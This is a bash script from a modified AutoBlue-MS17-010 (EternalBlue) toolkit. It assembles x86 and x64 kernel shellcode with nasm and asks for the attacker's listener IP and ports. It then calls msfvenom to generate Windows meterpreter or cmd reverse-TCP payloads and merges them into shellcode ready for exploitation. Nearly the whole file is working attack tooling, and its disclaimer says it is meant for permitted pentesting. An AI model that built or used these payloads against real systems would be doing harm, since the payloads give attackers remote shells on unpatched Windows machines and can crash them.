#!/bin/bash
DEFLPORTX86=444
DEFLPORTX64=443

tput setaf 4
set -e
cat << "EOF"
                 _.-;;-._
          '-..-'| X || X |
~~~~~~~~~~'-..-'|_.-;;-._|~~~~~~~~~~~~~~~~~~~~~~
 ~ ~ ~ ~ ~'-..-'|   ||   |~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
~    ~    '-..-'|_.-''-._|~   ~   ~   ~   ~   ~
        )                    (    ) (            
 (   ( /(  (  (            ) )\( /( )\  (    (   
 )\  )\())))\ )(   (    ( /(((_)\()|(_)))\  ))\  
((_)(_))//((_|()\  )\ ) )(_))_((_)\ _ /((_)/((_) 
| __| |_(_))  ((_)_(_/(((_)_| | |(_) (_))((_))   
| _||  _/ -_)| '_| ' \)) _` | | '_ \ | || / -_)  
|___|\__\___||_| |_||_|\__,_|_|_.__/_|\_,_\___| 
EOF
tput setaf 1
echo "Eternal Blue (MS17-010) - Windows Shellcode Compiler"
echo "####################################################"
echo "modified by derco0n - Version: 2019/12"
echo "Files under: \"https://github.com/derco0n/AutoBlue-MS17-010\""
echo ""
echo "Disclaimer:"
echo "###########"
echo "In most countries it is illegal to use this type of software against systems without explicit permission."
echo "I'm not responsible for any damage, that you might cause by using this exploit. -> You have to go to prison yourself."
echo ""
echo "Use this only against your own machines, in a safe testing environment or while pentesting."
echo "Always make sure you have the permissions needed to attack a system."
echo "You should also keep in mind, that this is exploiting windows-system-services, which has a real risk of crashing the target."
echo " - That's what the names comes from: Eternal-Blue(screen)"
echo ""
echo "If you use this software, you'll do it at your own risk and responibility."
echo "##########################################################################"
tput sgr0
echo "Do you wish to continue? (Y/n)"
read genMSF
if [[ $genMSF =~ [yY](es)* ]]; then
	echo ""
	echo ""
	echo ""
	echo "Cleaning old builds..."
	/bin/bash ./clean.sh
	echo ""
	echo Compiling x64 kernel shellcode
	echo "Invoking: nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin"
	nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin
	echo 'Compiling x86 kernel shellcode'
	echo "Invoking: nasm -f bin eternalblue_kshellcode_x86.asm -o sc_x86_kernel.bin"
	nasm -f bin eternalblue_kshellcode_x86.asm -o sc_x86_kernel.bin
	echo "#############################"
	echo ""
	echo kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? \(Y\/n\)
	read genMSF
	if [[ $genMSF =~ [yY](es)* ]]; then
	    payloadstr=""
	    #	LHOST
	    #############
	    # Get Hosts IP-Adresses
	    IFs=" " read -r -a hostips <<< $(hostname -I)
            echo "We need a LHOST for reverse connection"
	    echo "These are your local IP-adress(es)."
            maxindex=-1
	    for index in "${!hostips[@]}"; do
       	    	echo "$index ${hostips[index]}"
		maxindex=$index
	    done
	    echo "Please enter the index-number of the interface you want to use as LHOST or anything different to enter an LHOST manually."
            read intindex
	    if [[ "$intindex" =~ ^[0-9]+$ ]] && [[ $intindex -ge 0 ]] && [[ $intindex -le $maxindex ]]; then # Must be a number and in valid range of interface-indexes
		ip=${hostips[intindex]}
		echo "You've choosen $ip as LHOST"
	    else
		echo "invalid index => \"$intindex\""
		echo "Please enter LHOST for reverse connection:"
		read ip
	    fi

	    #	LPORT x64
	    ###############
	    echo "Do you want to use $DEFLPORTX64 as LPORT for incoming x64-connections? (Y/N)"
	    read usedefp64
	    if [[ $usedefp64 =~ [yY](es)* ]]; then
		portOne=$DEFLPORTX64
	    else
		echo "Please enter LPORT you want x64 to listen on:"
	    	read portOne
	    fi

	    #	LPORT x86
	    ###############
	    echo "Do you want to use $DEFLPORTX86 as LPORT for incoming x86-connections? (Y/N)"
	    read usedefp86
	    if [[ $usedefp86 =~ [yY](es)* ]]; then
		portTwo=$DEFLPORTX86
	    else
		echo "Please enter LPORT you want x86 to listen on:"
	    	read portTwo
	    fi

	    #   Shelltype
            ###############
	    echo "Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell"
	    read cmd

	    if [[ $cmd -eq 0 ]]; then
		echo "Will generate meterpreter-payload..."
		payloadstr="meterpreter"
	    elif [[ $cmd -eq 1 ]]; then
		echo "Will generate regular cmd-shell-payload..."
		payloadstr="shell"
	    else
		echo "Invalid shell-option...exiting..."
	        exit 1
	    fi

	    echo "Type 0 to generate a staged payload or 1 to generate a stageless payload"
	    read cmd
	    if [[ $cmd -eq 0 ]]; then
    		echo "...staged."
		payloadstr="${payloadstr}/reverse_tcp"
	    elif [[ $cmd -eq 1 ]]; then
		echo "...non staged."
		payloadstr="${payloadstr}_reverse_tcp"
	    else
		echo "Invalid staging-option...exiting..."
	        exit 2
	    fi

	    echo "payloadstr is \"$payloadstr\"" # DEBUG
	    echo "Building shellcodes using msfvenom"
	    echo ""
	    echo "Building for x64..."
	    echo "msfvenom -a x64 -p windows/x64/$payloadstr --platform windows -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne"
	    msfvenom -a x64 -p windows/x64/$payloadstr --platform windows -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
	    echo "done."
	    echo ""
	    echo "Building for x86..."
	    echo "msfvenom -a x86 -p windows/$payloadstr --platform windows -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo"
	    msfvenom -a x86 -p windows/$payloadstr --platform windows -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
	    echo "done."
	fi
        # MERGING Shellcodes
        ######################
	echo ""
	echo "MERGING SHELLCODE..."
	echo "####################"
	echo "cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin"
	cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
	echo "cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin"
	cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin
	python eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin
	echo "Listing .bin-files"
	echo "##################"
	ls ./ -lisa | grep .bin
	echo ""
	echo "DONE"
	echo "You may now use your shellcode for exploitation."
	exit 0
else
	# Aborted by user
	echo "OK. Bye"
fi
